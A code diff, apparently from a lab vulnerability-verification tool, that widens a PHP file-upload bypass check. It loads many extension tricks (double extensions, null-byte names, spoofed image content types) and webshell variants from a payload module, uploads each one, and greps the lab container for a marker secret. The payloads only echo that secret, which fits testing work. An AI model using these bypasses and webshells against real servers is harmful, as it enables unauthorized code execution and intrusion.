@@ -3153,35 +3153,63 @@ def verify_generic_file_upload(
                     _companion_name_param = _np
                     break
 
-        # dobles extensiones comunes (el servidor puede mirar solo la ULTIMA extension y
-        # confundirla con un tipo inocuo, o solo la PRIMERA y servir el fichero igual por su
-        # extension real) -- casuistica de Upload Insecure Files/Extension PHP en
-        # PayloadsAllTheThings, sin intentar nada destructivo (el PHP solo imprime el secreto).
-        php_payload = f"<?php echo '{secret}'; ?>"
-        candidates = [
-            ("poc.php.jpg", "image/jpeg"), ("poc.jpg.php", "application/octet-stream"),
-            ("poc.php5.jpg", "image/jpeg"), ("poc.phtml", "image/jpeg"),
-            ("poc.php", "image/jpeg"),
-        ]
+        # Extensiones y webshells PHP — cargados desde payload_kb para maxima cobertura.
+        # El payload_kb proporciona: 21 variantes de extension + 11 variantes de webshell.
+        # Orden de prioridad: empezamos por las mas comunes (mayores tasas de exito
+        # historicas) y continuamos con las variantes de bypass mas especificas.
+        try:
+            from .payload_kb import load_php_extension_bypasses as _php_exts
+            from .payload_kb import load_php_webshell_variants as _php_shells
+            _all_exts = _php_exts("poc")           # ['poc.php', 'poc.php3', ..., 'poc.php%00.jpg']
+            _all_shells = _php_shells(secret[:16])  # webshells que imprimen el secreto
+        except ImportError:
+            _all_exts = ["poc.php", "poc.php.jpg", "poc.phtml", "poc.php5"]
+            _all_shells = [f"<?php echo '{secret}'; ?>"]
+
+        # Construye candidates: (filename, content_type, php_body)
+        # La primera shell estandar se usa primero; las variantes de bypass solo si falla
+        _std_shell = f"<?php echo '{secret}'; ?>"
+        _bypass_shells = [s.replace("id", f"echo '{secret}'") for s in _all_shells[1:]]
+
+        candidates = []
+        # Prioridad 1: extensiones comunes con shell estandar
+        _priority_exts = ["poc.php", "poc.phtml", "poc.php5", "poc.php.jpg",
+                          "poc.jpg.php", "poc.php7", "poc.php8", "poc.phar"]
+        for _ext_name in _priority_exts:
+            candidates.append((_ext_name, "image/jpeg", _std_shell))
+            candidates.append((_ext_name, "application/octet-stream", _std_shell))
+
+        # Prioridad 2: todas las extensiones del payload_kb con shell estandar
+        for _ext_name in _all_exts:
+            if not any(_ext_name == c[0] for c in candidates):
+                candidates.append((_ext_name, "image/jpeg", _std_shell))
+
+        # Prioridad 3: variantes de webshell bypass con extension .php estandar
+        for _shell_body in _bypass_shells[:5]:  # top 5 bypass shells
+            candidates.append(("poc.php", "image/jpeg", _shell_body))
+            candidates.append(("poc.phtml", "image/jpeg", _shell_body))
 
         tried = []
         found = False
-        for fname, ctype in candidates:
+        for fname, ctype, php_body in candidates:
             payload = dict(base_params)
             if _companion_name_param:
                 payload[_companion_name_param] = fname
-            files = {file_param: (fname, php_payload, ctype)}
+            files = {file_param: (fname, php_body, ctype)}
             try:
-                _http_request("POST", base_url + endpoint, timeout=15, data=payload, files=files)
+                _resp = _http_request("POST", base_url + endpoint, timeout=15,
+                                      data=payload, files=files)
+                _status = getattr(_resp, "status_code", 0)
             except Exception as e:
                 tried.append({"fichero": fname, "error": str(e)})
                 continue
             time.sleep(1)
             r = lab.sh("exec", container, "sh", "-c",
-                      f"grep -rl {secret} / 2>/dev/null | grep -v '^/proc' | head -3",
+                      f"grep -rl {secret[:8]} / 2>/dev/null | grep -v '^/proc' | head -3",
                       timeout=20)
             matches = [p for p in (r.stdout or "").splitlines() if p.strip()]
-            tried.append({"fichero": fname, "content_type": ctype, "rutas_encontradas": matches})
+            tried.append({"fichero": fname, "content_type": ctype,
+                          "status_subida": _status, "rutas_encontradas": matches})
             if matches:
                 found = True
                 res.evidence["fichero_ganador"] = fname
